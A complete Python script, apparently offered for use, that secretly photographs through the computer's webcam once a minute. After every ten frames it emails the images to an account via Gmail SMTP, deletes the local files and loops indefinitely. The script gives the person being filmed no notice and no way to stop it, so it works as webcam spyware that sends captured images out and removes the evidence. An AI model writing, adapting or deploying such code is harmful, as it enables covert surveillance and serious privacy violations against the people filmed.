#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import cv2
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

def photo_mail(email, password):
	i = 1
	msg = MIMEMultipart()
	msg['Subject'] = 'Данные'
	body = "Фотографии с веб-камеры"
	msg.attach(MIMEText(body, 'plain')) 
	while True:
		try:
			part = MIMEApplication(open('img' + str(i) + '.png', 'rb').read())
			part.add_header('Content-Disposition', 'attachment', filename = 'img' + str(i) + '.png')
			msg.attach(part)
			i += 1
		except FileNotFoundError:
			server = smtplib.SMTP('smtp.gmail.com', 587)
			server.starttls()
			server.login(email, password)
			server.sendmail(email, email, msg.as_string())
			server.quit()
			break

def webcam(time_interval):
	i = 1
	while True:
		cap = cv2.VideoCapture(0)
		ret, frame = cap.read()
		cv2.imwrite('img' + str(i) + '.png', frame)
		cap.release()
		if i == 10:
			photo_mail('email', 'password')
			for i in range(1, 11):
				os.remove('img' + str(i) + '.png')
			i = 1
			continue
		i += 1
		time.sleep(time_interval)

webcam(60)
